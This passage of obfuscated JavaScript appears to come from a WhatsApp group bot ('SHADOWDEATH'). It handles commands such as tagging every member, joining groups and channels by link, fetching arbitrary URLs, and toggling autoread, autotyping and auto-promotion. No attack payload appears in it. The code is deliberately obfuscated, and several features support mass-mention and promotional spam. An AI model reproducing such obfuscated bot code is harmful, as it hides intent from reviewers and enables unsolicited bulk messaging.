                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "pesannya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x73f136 = _0x1aeaf2 + "\n\n";
          let _0x14e0eb = await _0x2f6673.metadata.participants.map(_0x11ba57 => _0x11ba57.id).filter(_0x33a101 => _0x33a101 !== _0x3a968e && _0x33a101 !== _0x2f6673.sender);
          await _0x14e0eb.forEach(_0x4c11f6 => {
            _0x73f136 += '@' + _0x4c11f6.split('@')[0x0] + "\n";
          });
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x73f136,
            'mentions': [..._0x14e0eb]
          }, {
            'quoted': _0x2f6673
          });
        }
        break;
      case "linkgc":
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.isBotAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.botAdmin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          const _0x2ebe2c = "https://chat.whatsapp.com/" + (await _0x47285b.groupInviteCode(_0x2f6673.chat));
          var _0x26a5c9 = "\n" + _0x2ebe2c + "\n";
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x26a5c9,
            'matchedText': '' + _0x2ebe2c
          }, {
            'quoted': _0x2f6673
          });
        }
        break;
      case 'tn':
      case "tanda":
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x429a13 && !_0x2f6673.isAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.admin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "pesannya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x2608bb = _0x2f6673.metadata.participants.map(_0x581fb8 => _0x581fb8.id);
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x1aeaf2,
            'mentions': [..._0x2608bb]
          }, {
            'quoted': _0x2f6673
          });
        }
        break;
      case "joingc":
      case 'join':
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "linkgcnya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2.includes("chat.whatsapp.com")) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Link tautan tidak valid",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x38bcf7 = _0x1aeaf2.split("https://chat.whatsapp.com/")[0x1];
          let _0x18162e = await _0x47285b.groupAcceptInvite(_0x38bcf7);
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': '' + ("Berhasil bergabung ke dalam grup " + _0x18162e),
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "get":
      case 'g':
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + 'https://example.com' + "\n");
          }
          let _0x1ddd56 = await fetchJson(_0x1aeaf2);
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': '' + JSON.stringify(_0x1ddd56, null, 0x2),
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "joinch":
      case "joinchannel":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2 && !_0x2f6673.quoted) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "linkchnya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2.includes("https://whatsapp.com/channel/") && !_0x2f6673.quoted.text.includes('https://whatsapp.com/channel/')) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Link tautan tidak valid",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x258dc8 = _0x2f6673.quoted ? _0x2f6673.quoted.text.split("https://whatsapp.com/channel/")[0x1] : _0x1aeaf2.split("https://whatsapp.com/channel/")[0x1];
          let _0x36b1db = await _0x47285b.newsletterMetadata('invite', _0x258dc8);
          await _0x47285b.newsletterFollow(_0x36b1db.id);
          _0x2f6673.reply("\n*Berhasil join channel whatsapp ✅*\n* Nama channel : *" + _0x36b1db.name + "*\n* Total pengikut : *" + (_0x36b1db.subscribers + 0x1) + "*\n");
        }
        break;
      case 'autoread':
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x5558c8 = _0x1aeaf2.toLowerCase();
          if (_0x5558c8 == 'on') {
            if (global.db.settings.autoread == true) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "*Autoread* sudah aktif!",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            global.db.settings.autoread = true;
            return _0x2f6673.reply("Berhasil menyalakan *autoread*");
          } else {
            if (_0x5558c8 == "off") {
              if (global.db.settings.autoread == false) {
                return _0x47285b.sendMessage(_0x2f6673.chat, {
                  'text': "*Autoread* tidak aktif!",
                  'contextInfo': {
                    'mentionedJid': [_0x2f6673.sender],
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                      'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                      'body': 'VynxOfficial',
                      'previewType': "PHOTO"
                    }
                  }
                }, {
                  'quoted': _0x5560b2
                });
              }
              global.db.settings.autoread = false;
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Berhasil mematikan *autoread*",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            } else {
              return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + 'on/off' + "\n");
            }
          }
        }
        break;
      case "autopromosi":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + 'on/off' + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x589828 = _0x1aeaf2.toLowerCase();
          if (_0x589828 == 'on') {
            if (global.db.settings.autopromosi == true) {
              return _0x2f6673.reply("*Autopromosi* sudah aktif!");
            }
            global.db.settings.autopromosi = true;
            return _0x2f6673.reply("Berhasil menyalakan *autopromosi*");
          } else {
            if (_0x589828 == "off") {
              if (global.db.settings.autopromosi == false) {
                return _0x47285b.sendMessage(_0x2f6673.chat, {
                  'text': "*Autopromosi* tidak aktif!",
                  'contextInfo': {
                    'mentionedJid': [_0x2f6673.sender],
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                      'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                      'body': 'VynxOfficial',
                      'previewType': "PHOTO"
                    }
                  }
                }, {
                  'quoted': _0x5560b2
                });
              }
              global.db.settings.autopromosi = false;
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Berhasil mematikan *autopromosi*",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            } else {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + 'on/off' + "\n"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          }
        }
        break;
      case "autotyping":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x48a33a = _0x1aeaf2.toLowerCase();
          if (_0x48a33a == 'on') {
            if (global.db.settings.autotyping == true) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "*Autotyping* sudah aktif!",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            global.db.settings.autotyping = true;
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Berhasil menyalakan *autotyping*",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          } else {
            if (_0x48a33a == "off") {
              if (global.db.settings.autotyping == false) {
                return _0x47285b.sendMessage(_0x2f6673.chat, {
                  'text': "*Autotyping* tidak aktif!",
                  'contextInfo': {
                    'mentionedJid': [_0x2f6673.sender],
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                      'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                      'body': 'VynxOfficial',
                      'previewType': "PHOTO"
                    }
                  }
                }, {
                  'quoted': _0x5560b2
                });
              }
              global.db.settings.autotyping = false;
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Berhasil mematikan *autotyping*",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            } else {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + 'on/off' + "\n"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          }
        }
        break;
      case 'autoreadsw':
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x3e39cd = _0x1aeaf2.toLowerCase();
          if (_0x3e39cd == 'on') {
            if (global.db.settings.readsw == true) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "*Autoreadsw* sudah aktif!",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            global.db.settings.readsw = true;
            return _0x2f6673.reply("Berhasil menyalakan *autoreadsw*");
          } else {
            if (_0x3e39cd == "off") {
              if (global.db.settings.readsw == false) {
                return _0x2f6673.reply("*Autoreadsw* tidak aktif!");
              }
              global.db.settings.readsw = false;
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Berhasil mematikan *autoreadsw*",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            } else {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + 'on/off' + "\n"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          }
        }
        break;
      case 'welcome':
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + 'on/off' + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x16b7fa = _0x1aeaf2.toLowerCase();
          if (_0x16b7fa == 'on') {
            if (global.db.groups[_0x2f6673.chat].welcome == true) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "*Welcome* di grup ini sudah aktif!",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            global.db.groups[_0x2f6673.chat].welcome = true;
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Berhasil menyalakan *welcome* di grup ini",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          } else {
            if (_0x16b7fa == 'off') {
              if (global.db.groups[_0x2f6673.chat].welcome == false) {
                return _0x47285b.sendMessage(_0x2f6673.chat, {
                  'text': "*Welcome* di grup ini tidak aktif!",
                  'contextInfo': {
                    'mentionedJid': [_0x2f6673.sender],
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                      'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                      'body': 'VynxOfficial',
                      'previewType': "PHOTO"
                    }
                  }
                }, {
                  'quoted': _0x5560b2
                });
              }
              global.db.groups[_0x2f6673.chat].welcome = false;
              return _0x2f6673.reply("Berhasil mematikan *welcome* di grup ini");
            } else {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          }
        }
        break;
      case "antilink":
        {
          if (!_0x2f6673.isGroup) {
